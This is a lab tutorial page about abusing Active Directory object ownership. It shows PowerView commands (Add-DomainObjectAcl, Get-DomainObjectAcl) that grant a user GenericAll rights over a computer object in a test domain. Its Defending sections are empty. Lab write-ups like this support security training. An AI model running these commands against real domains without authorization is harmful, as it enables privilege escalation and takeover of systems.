---
description: If you are "Owner" of a object, you can change the DACL of the object.
---

# Owns

## Configuring

### Prerequisite

{% content-ref url="page-2.md" %}
[page-2.md](page-2.md)
{% endcontent-ref %}

### Configuring

Nothing need to be configured to abuse this since we set the Owner of the object during the attack in the "Write Owner" section. If you would like to configure this it can be configured the same way as we configured "Write Owner".

## Attacking

### How it works

If you are "Owner" of a object, you can change the DACL of the object. Meaning you can give any object "GenericAll" or any other specific permissions.

### Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### Executing the attack

1. We will continue the attack from where we left off from the page "Write Owner".

{% content-ref url="page-2.md" %}
[page-2.md](page-2.md)
{% endcontent-ref %}

2\. We just made the user `sa_sql` owner of the computerobject `DATA01`. The next step is to write to the DACL of the computerobject and give `sa_sql` genericall permission. This can be done with PowerView and the cmdlet `Add-DomainObjectAcl`.

```
Add-DomainObjectAcl -Domain secure.local -Credential $creds -TargetIdentity DATA01 -PrincipalIdentity sa_sql -Rights All -Verbose
```

![](<../../../.gitbook/assets/image (26).png>)

3\. PowerView gives some errors but it seems like it found the correct information and tried to set the ACL's. We can check this by running BloodHound again or querying the Domain Controller for all ACL's from DATA01 and filter. First we have to get the objectsid from the user `sa_sql` and then we can use the cmdlet `Get-DomainObjectACL` to query all the ACL's for `DATA01`.

```
Get-DomainUser -Domain secure.local -Credential $creds -Server 10.0.0.100 sa_sql | Select-Object samaccountname, objectsid
Get-DomainObjectAcl -Domain secure.local -Credential $creds -Server 10.0.0.100 -SamAccountName data01 | ? {$_.SecurityIdentifier -eq "S-1-5-21-1498997062-1091976085-892328878-1106"}
```

![](<../../../.gitbook/assets/image (43).png>)

From the output we can see that the user `sa_sql` has GenericAll permission on `DATA01`. Since we own the lab we can also check it out on the Domain Controller, the same way as we configured the Owner permissions. And it has all the permissions:

![](<../../../.gitbook/assets/image (9).png>)

### Cleanup

The cleanup for Both "Owns" and "GenericAll" are on the "GenericAll" page.

{% content-ref url="genericall.md" %}
[genericall.md](genericall.md)
{% endcontent-ref %}

## Defending

### Recommendations



### Detection



## References

{% embed url="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#owns" %}

